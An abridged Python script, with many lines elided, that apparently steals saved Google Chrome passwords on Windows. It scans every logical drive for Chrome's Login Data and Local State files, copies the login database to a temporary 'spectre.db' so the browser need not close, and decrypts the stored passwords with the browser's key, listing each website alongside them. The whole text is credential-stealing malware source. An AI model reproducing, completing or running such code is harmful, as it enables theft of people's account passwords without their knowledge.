...
def list_partition():
    drive = []  # Stores drive
    GetLogicalDrive = windll.kernel32.GetLogicalDrives()  # call
    for letter in string.ascii_uppercase:
        if GetLogicalDrive & 1:  # if the drive matches
            drive.append(letter)  # add to list
        GetLogicalDrive >>= 1  # reset
    return drive
...
def OpenLoginDb(path):
    shutil.copy2(path, "spectre.db")  # makes a temp DB file so chrome doesn't have to be shut down
...
def DecryptAbove80(CipherText, key):
    s = ""
...
def main():
    ...
    # Default path locations to look
    ...
    for drive in drives:  # goes though each hard drive on windows to find files.
        drive = drive + ":\\"
        try:  # Try in case file path is default
            ...
            s += "%s\n" % (f"Exception: {Jenova}, Scanning drives. . .",)
            ...
            if chrome:  # If chrome is found proceed to login data and local state
                if LoginData and LocalState:  # and local state
                    ...
                    break
            elif LoginData and LocalState:  # if chrome isn't found, proceed to try and find login data and local state
    ...
    for results in DbResults:  # Reads thru database file
        ...
        above_v80 = DecryptAbove80(results[2], DecryptedKey)  # Pass in the password field, and the blob key
        s += "%s\n" % (f"Website:  {results[0]}",)
